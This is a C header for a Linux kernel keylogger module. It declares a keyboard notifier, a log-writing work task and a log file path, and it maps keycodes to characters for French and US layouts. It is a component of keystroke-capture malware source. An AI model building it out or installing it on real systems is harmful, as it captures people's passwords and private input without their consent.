
#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/workqueue.h>

#define MAX_BUFFER_SIZE 256
#define TMP_BUFF_SIZE 16
#define LOG_FILE_PATH "/var/log/keylogger.log"

struct keyboard_logger {
    struct file *log_file;
    struct notifier_block keyboard_notifier;
    struct work_struct writer_task;

    char *keyboard_buffer;
    char *write_buffer;

    size_t buffer_offset;
    size_t buffer_len;
    loff_t file_off;

    char side_buffer[MAX_BUFFER_SIZE];
    char back_buffer[MAX_BUFFER_SIZE];

    const char *layout;
};

static struct keyboard_logger *klogger;

void flush_buffer(struct keyboard_logger *klogger);
size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size);
int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data);
void write_log_task(struct work_struct *work);
void execute_keylogger_command(const char **args, int arg_count);

static const char *fr_keymap[][2] = {
    {"\0", "\0"},           // 0
    {"\0", "\0"},           // 1
    {"&", "1"},             // 2
    {"é", "2"},             // 3
    {"\"", "3"},            // 4
    {"'", "4"},             // 5
    {"(", "5"},             // 6
    {"-", "6"},             // 7
    {"è", "7"},             // 8
    {"_", "8"},             // 9
    {"ç", "9"},             // 10
    {"à", "0"},             // 11
    {")", "°"},             // 12
    {"=", "+"},             // 13
    {"_DEL_", "_DEL_"},     // 14
    {"_TAB_", "_TAB_"},     // 15
    {"a", "A"},             // 16
    {"z", "Z"},             // 17
    {"e", "E"},             // 18
    {"r", "R"},             // 19
    {"t", "T"},             // 20
    {"y", "Y"},             // 21
    {"u", "U"},             // 22
    {"i", "I"},             // 23
    {"o", "O"},             // 24
    {"p", "P"},             // 25
    {"^", "¨"},             // 26
    {"$", "£"},             // 27
    {"_ENTER_\n", "_ENTER_\n"},           // 28
    {"\0", "\0"},           // 29
    {"q", "Q"},             // 30
    {"s", "S"},             // 31
    {"d", "D"},             // 32
    {"f", "F"},             // 33
    {"g", "G"},             // 34
    {"h", "H"},             // 35
    {"j", "J"},             // 36
    {"k", "K"},             // 37
    {"l", "L"},             // 38
    {"m", "M"},             // 39
    {"ù", "%"},             // 40
    {"²", "~"},           // 41
    {"_LSHIFT_", "_LSHIFT_"}, // 42
    {"*", "µ"},             // 43
    {"w", "W"},             // 44
    {"x", "X"},             // 45
    {"c", "C"},             // 46
    {"v", "V"},             // 47
    {"b", "B"},             // 48
    {"n", "N"},             // 49
    {",", "?"},             // 50
    {";", "."},             // 51
    {":", "/"},             // 52
    {"!", "§"},             // 53
    {"\0", "\0"},           // 54
    {"\0", "\0"},           // 55
    {"\0", "\0"},             // 56
    {" ", " "},           // 57
    {"_VER_MAJ_", "_VER_MAJ_"}, // 58
    {"F1", "F1"},           // 59
    {"F2", "F2"},           // 60
    {"F3", "F3"},           // 61
    {"F4", "F4"},           // 62
    {"F5", "F5"},           // 63
    {"F6", "F6"},           // 64
    {"F7", "F7"},           // 65
    {"F8", "F8"},           // 66
    {"F9", "F9"},           // 67
    {"F10", "F10"},         // 68
    {"_NUM_", "_NUM_"},     // 69
    {"_SCROLL_", "_SCROLL_"}, // 70
    {"_KPD7_", "_HOME_"},   // 71
    {"_KPD8_", "_UP_"},     // 72
    {"_KPD9_", "_PGUP_"},   // 73
    {"_KPD6_", "_RIGHT_"},  // 74
    {"+", "+"},              // 75
    {"_KPD1_", "_END_"},    // 76
    {"_KPD2_", "_DOWN_"},   // 77
    {"_KPD3_", "_PGDN_"},   // 78
    {"_KPD0_", "_INS_"},    // 79
    {"_KPD._", "_DEL_"},    // 80
    {"_SYSRQ_", "_SYSRQ_"}, // 81
    {"\0", "\0"},           // 82
    {"\0", "\0"},           // 83
    {"F11", "F11"},         // 84
    {"F12", "F12"},         // 85
    {"<", "<"},              // 86
    {"\0", "\0"},           // 87
    {"\0", "\0"},           // 88
    {"\0", "\0"},           // 89
    {"\0", "\0"},           // 90
    {"\0", "\0"},           // 91
    {"\0", "\0"},           // 92
    {"\0", "\0"},           // 93
    {"\0", "\0"},           // 94
    {"\0", "\0"},           // 95
    {"_KPENTER_", "_KPENTER_"}, // 96
    {"_RCTRL_", "_RCTRL_"}, // 97
    {"/", "/"},              // 98
    {"_PRTSCR_", "_PRTSCR_"}, // 99
    {"_RALT_", "_RALT_"},   // 100
    {"\0", "\0"},           // 101
    {"_HOME_", "_HOME_"},   // 102
    {"_UP_", "_UP_"},       // 103
    {"_PGUP_", "_PGUP_"},   // 104
    {"_LEFT_", "_LEFT_"},   // 105
    {"_RIGHT_", "_RIGHT_"}, // 106
    {"_END_", "_END_"},     // 107
    {"_DOWN_", "_DOWN_"},   // 108
    {"_PGDN_", "_PGDN_"},   // 109
    {"_INS_", "_INS_"},     // 110
    {"_DEL_", "_DEL_"},     // 111
    {"\0", "\0"},           // 112
    {"\0", "\0"},           // 113
    {"\0", "\0"},           // 114
    {"\0", "\0"},           // 115
    {"\0", "\0"},           // 116
    {"\0", "\0"},           // 117
    {"\0", "\0"},           // 118
    {"_PAUSE_", "_PAUSE_"}, // 119
};

static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};

#endif // KEYLOGGER_H
